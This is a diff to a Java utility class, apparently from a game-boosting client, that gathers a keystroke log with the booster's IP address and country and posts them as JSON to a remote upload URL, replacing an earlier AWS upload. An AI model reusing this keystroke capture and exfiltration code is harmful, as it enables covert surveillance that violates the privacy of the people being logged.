@@ -1,8 +1,18 @@
 package services;
 
+import com.google.gson.Gson;
+import com.google.gson.JsonArray;
+import com.google.gson.JsonElement;
+import com.google.gson.JsonObject;
+import logger.Globals;
 import logger.KeyLogger;
 import model.orders.Order;
 import model.User;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
+import org.apache.http.impl.client.HttpClientBuilder;
 import org.json.JSONException;
 import org.json.JSONObject;
 import view.AlertBox;
@@ -27,16 +37,48 @@ public class Utils {
 
 
     public void uploadLog(User user, Order order) {
-        try {
-            if(checkForBadWords(KeyLogger.log)) {
+        if(checkForBadWords(KeyLogger.log)) {
                 Utils.foundBadWord = true;
-            }
-            AWSWebService webService =  new AWSWebService();
-            webService.WebService(createLogFile(), createKey(user, order));
-            KeyLogger.log.clear();
-        } catch (IOException e) {
-            e.printStackTrace();
         }
+        JsonObject jsonObject = new JsonObject();
+        JsonArray logFile = new JsonArray();
+        logFile.add("The booster's IP adress is: " + getMyIp() + "\n");
+        logFile.add("The booster's Country is: " + getMyCountry() + "\n");
+        for (String message : KeyLogger.log) {
+            logFile.add(message + "\n");
+        }
+        jsonObject.add("logFile", logFile);
+        jsonObject.addProperty("fileName", createKey(user, order));
+
+        System.out.println(jsonObject);
+        sendJson(Globals.logUploadURL, jsonObject);
+//        try {
+//            if(checkForBadWords(KeyLogger.log)) {
+//                Utils.foundBadWord = true;
+//            }
+//            AWSWebService webService =  new AWSWebService();
+//            webService.WebService(createLogFile(), createKey(user, order));
+//            KeyLogger.log.clear();
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
+    }
+
+
+    private boolean sendJson(String url, JsonObject jsonObject) {
+        HttpClient httpClient = HttpClientBuilder.create().build();
+
+        try {
+            HttpPost request = new HttpPost(url);
+            StringEntity params =new StringEntity(jsonObject.toString());
+            request.addHeader("content-type", "application/json");
+            request.setEntity(params);
+            HttpResponse response = httpClient.execute(request);
+            return true;
+        }catch (Exception ex) {
+            System.out.println(ex);
+        }
+        return false;
     }
 
     private boolean checkForBadWords(ArrayList<String> log) {
@@ -200,5 +242,7 @@ public class Utils {
             System.out.println("ASD");
         }
     }
+
+
 
 }
